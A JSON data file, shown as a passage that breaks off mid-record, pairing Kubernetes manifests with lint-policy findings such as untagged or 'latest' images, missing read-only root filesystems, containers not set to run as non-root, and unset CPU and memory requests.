[
  {
    "id": "00835",
    "manifest_path": "data/manifests/the_stack_sample/sample_0173.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:latest\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"zookeeper\" is using an invalid container image, \"zcguan/storm-cluster:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00836",
    "manifest_path": "data/manifests/the_stack_sample/sample_0173.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:latest\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"zookeeper\" does not have a read-only root file system"
  },
  {
    "id": "00837",
    "manifest_path": "data/manifests/the_stack_sample/sample_0173.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:latest\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"zookeeper\" is not set to runAsNonRoot"
  },
  {
    "id": "00838",
    "manifest_path": "data/manifests/the_stack_sample/sample_0173.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:latest\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"zookeeper\" has cpu request 0"
  },
  {
    "id": "00839",
    "manifest_path": "data/manifests/the_stack_sample/sample_0173.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: apache-storm-nimbus\nspec:\n  replicas: 1\n  selector:\n    storm: nimbus\n  template:\n    metadata:\n      labels:\n        storm: nimbus\n        app: storm\n    spec:\n      containers:\n      - name: zookeeper\n        image: zcguan/storm-cluster:latest\n        env:\n        - name: CONFIGURE_ZOOKEEPER\n          value: 'true'\n        - name: STORM_CMD\n          value: nimbus\n        volumeMounts:\n        - name: storm-data\n          mountPath: /opt/apache-storm/storm-local\n      volumes:\n      - name: storm-data\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"zookeeper\" has memory limit 0"
  },
  {
    "id": "00840",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"git\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00841",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"trigger\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00842",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git\" does not have a read-only root file system"
  },
  {
    "id": "00843",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"trigger\" does not have a read-only root file system"
  },
  {
    "id": "00844",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git\" is not set to runAsNonRoot"
  },
  {
    "id": "00845",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"trigger\" is not set to runAsNonRoot"
  },
  {
    "id": "00846",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git\" has cpu request 0"
  },
  {
    "id": "00847",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"trigger\" has cpu request 0"
  },
  {
    "id": "00848",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git\" has memory limit 0"
  },
  {
    "id": "00849",
    "manifest_path": "data/manifests/the_stack_sample/sample_0176.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: image-build-cron-trigger\nspec:\n  jobTemplate:\n    template:\n      spec:\n        initContainers:\n        - name: git\n          env:\n          - name: GIT_REPOSITORY\n            value: github.com/tektoncd/plumbing\n          - name: GIT_REVISION\n            value: main\n        containers:\n        - name: trigger\n          env:\n          - name: SINK_URL\n            value: el-image-builder.default.svc.cluster.local:8080\n          - name: TARGET_IMAGE\n            value: gcr.io/tekton-releases/dogfooding/buildx-gcloud\n          - name: CONTEXT_PATH\n            value: tekton/images/buildx-gcloud\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"trigger\" has memory limit 0"
  },
  {
    "id": "00850",
    "manifest_path": "data/manifests/the_stack_sample/sample_0178.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"k8s-demo\" is using an invalid container image, \"diyblockchain/k8s-demo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00851",
    "manifest_path": "data/manifests/the_stack_sample/sample_0178.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"k8s-demo\" does not have a read-only root file system"
  },
  {
    "id": "00852",
    "manifest_path": "data/manifests/the_stack_sample/sample_0178.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"k8s-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "00853",
    "manifest_path": "data/manifests/the_stack_sample/sample_0178.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"k8s-demo\" has cpu request 0"
  },
  {
    "id": "00854",
    "manifest_path": "data/manifests/the_stack_sample/sample_0178.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nodehelloworld.example.com\n  labels:\n    app: helloworld\nspec:\n  containers:\n  - name: k8s-demo\n    image: diyblockchain/k8s-demo\n    ports:\n    - name: nodejs-port\n      containerPort: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"k8s-demo\" has memory limit 0"
  },
  {
    "id": "00855",
    "manifest_path": "data/manifests/the_stack_sample/sample_0181.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00856",
    "manifest_path": "data/manifests/the_stack_sample/sample_0181.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "00857",
    "manifest_path": "data/manifests/the_stack_sample/sample_0181.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "00858",
    "manifest_path": "data/manifests/the_stack_sample/sample_0181.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "00859",
    "manifest_path": "data/manifests/the_stack_sample/sample_0181.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-647\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "00860",
    "manifest_path": "data/manifests/the_stack_sample/sample_0183.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: maskrcnn-image-seg\nspec:\n  template:\n    spec:\n      containers:\n      - name: image-seg\n        image: centaurusinfra/test1_maskrcnn\n        command:\n        - python\n        args:\n        - -m\n        - torch.distributed.launch\n        - --nproc_per_node\n        - '2'\n        - tools/train_net.py\n        - --config-file\n        - configs/e2e_mask_rcnn_R_50_FPN_1x.yaml\n        - --max_steps\n        - '100'\n        - OUTPUT_DIR\n        - /results\n        resources:\n          limits:\n            nvidia.com/gpu: 2\n        volumeMounts:\n        - mountPath: /datasets/data\n          name: remote-data\n        - mountPath: /results\n          name: remote-results\n        - mountPath: /dev/shm\n          name: dshm\n      volumes:\n      - name: remote-data\n        hostPath:\n          path: /nfs_1/alnair/pytorch/segmentation/maskrcnn/coco_dataset/\n          type: Directory\n      - name: remote-results\n        hostPath:\n          path: /nfs_1/alnair/results\n          type: Directory\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"image-seg\" is using an invalid container image, \"centaurusinfra/test1_maskrcnn\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00861",
    "manifest_path": "data/manifests/the_stack_sample/sample_0183.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: maskrcnn-image-seg\nspec:\n  template:\n    spec:\n      containers:\n      - name: image-seg\n        image: centaurusinfra/test1_maskrcnn\n        command:\n        - python\n        args:\n        - -m\n        - torch.distributed.launch\n        - --nproc_per_node\n        - '2'\n        - tools/train_net.py\n        - --config-file\n        - configs/e2e_mask_rcnn_R_50_FPN_1x.yaml\n        - --max_steps\n        - '100'\n        - OUTPUT_DIR\n        - /results\n        resources:\n          limits:\n            nvidia.com/gpu: 2\n        volumeMounts:\n        - mountPath: /datasets/data\n          name: remote-data\n        - mountPath: /results\n          name: remote-results\n        - mountPath: /dev/shm\n          name: dshm\n      volumes:\n      - name: remote-data\n        hostPath:\n          path: /nfs_1/alnair/pytorch/segmentation/maskrcnn/coco_dataset/\n          type: Directory\n      - name: remote-results\n        hostPath:\n          path: /nfs_1/alnair/results\n          type: Directory\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"image-seg\" does not have a read-only root file system"
  },
  {
    "id": "00862",
    "manifest_path": "data/manifests/the_stack_sample/sample_0183.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: maskrcnn-image-seg\nspec:\n  template:\n    spec:\n      containers:\n      - name: image-seg\n        image: centaurusinfra/test1_maskrcnn\n        command:\n        - python\n        args:\n        - -m\n        - torch.distributed.launch\n        - --nproc_per_node\n        - '2'\n        - tools/train_net.py\n        - --config-file\n        - configs/e2e_mask_rcnn_R_50_FPN_1x.yaml\n        - --max_steps\n        - '100'\n        - OUTPUT_DIR\n        - /results\n        resources:\n          limits:\n            nvidia.com/gpu: 2\n        volumeMounts:\n        - mountPath: /datasets/data\n          name: remote-data\n        - mountPath: /results\n          name: remote-results\n        - mountPath: /dev/shm\n          name: dshm\n      volumes:\n      - name: remote-data\n        hostPath:\n          path: /nfs_1/alnair/pytorch/segmentation/maskrcnn/coco_dataset/\n          type: Directory\n      - name: remote-results\n        hostPath:\n          path: /nfs_1/alnair/results\n          type: Directory\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"image-seg\" is not set to runAsNonRoot"
  },
  {
    "id": "00863",
    "manifest_path": "data/manifests/the_stack_sample/sample_0183.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: maskrcnn-image-seg\nspec:\n  template:\n    spec:\n      containers:\n      - name: image-seg\n        image: centaurusinfra/test1_maskrcnn\n        command:\n        - python\n        args:\n        - -m\n        - torch.distributed.launch\n        - --nproc_per_node\n        - '2'\n        - tools/train_net.py\n        - --config-file\n        - configs/e2e_mask_rcnn_R_50_FPN_1x.yaml\n        - --max_steps\n        - '100'\n        - OUTPUT_DIR\n        - /results\n        resources:\n          limits:\n            nvidia.com/gpu: 2\n        volumeMounts:\n        - mountPath: /datasets/data\n          name: remote-data\n        - mountPath: /results\n          name: remote-results\n        - mountPath: /dev/shm\n          name: dshm\n      volumes:\n      - name: remote-data\n        hostPath:\n          path: /nfs_1/alnair/pytorch/segmentation/maskrcnn/coco_dataset/\n          type: Directory\n      - name: remote-results\n        hostPath:\n          path: /nfs_1/alnair/results\n          type: Directory\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"image-seg\" has cpu request 0"
  },
  {
    "id": "00864",
    "manifest_path": "data/manifests/the_stack_sample/sample_0183.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: maskrcnn-image-seg\nspec:\n  template:\n    spec:\n      containers:\n      - name: image-seg\n        image: centaurusinfra/test1_maskrcnn\n        command:\n        - python\n        args:\n        - -m\n        - torch.distributed.launch\n        - --nproc_per_node\n        - '2'\n        - tools/train_net.py\n        - --config-file\n        - configs/e2e_mask_rcnn_R_50_FPN_1x.yaml\n        - --max_steps\n        - '100'\n        - OUTPUT_DIR\n        - /results\n        resources:\n          limits:\n            nvidia.com/gpu: 2\n        volumeMounts:\n        - mountPath: /datasets/data\n          name: remote-data\n        - mountPath: /results\n          name: remote-results\n        - mountPath: /dev/shm\n          name: dshm\n      volumes:\n      - name: remote-data\n        hostPath:\n          path: /nfs_1/alnair/pytorch/segmentation/maskrcnn/coco_dataset/\n          type: Directory\n      - name: remote-results\n        hostPath:\n          path: /nfs_1/alnair/results\n          type: Directory\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"image-seg\" has memory limit 0"
  },
  {
    "id": "00865",
    "manifest_path": "data/manifests/the_stack_sample/sample_0184.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00866",
    "manifest_path": "data/manifests/the_stack_sample/sample_0184.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "00867",
    "manifest_path": "data/manifests/the_stack_sample/sample_0184.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "00868",
    "manifest_path": "data/manifests/the_stack_sample/sample_0184.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "00869",
    "manifest_path": "data/manifests/the_stack_sample/sample_0184.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6685\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "00870",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00871",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00872",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "00873",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "00874",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "00875",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "00876",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "00877",
    "manifest_path": "data/manifests/the_stack_sample/sample_0189.yaml",
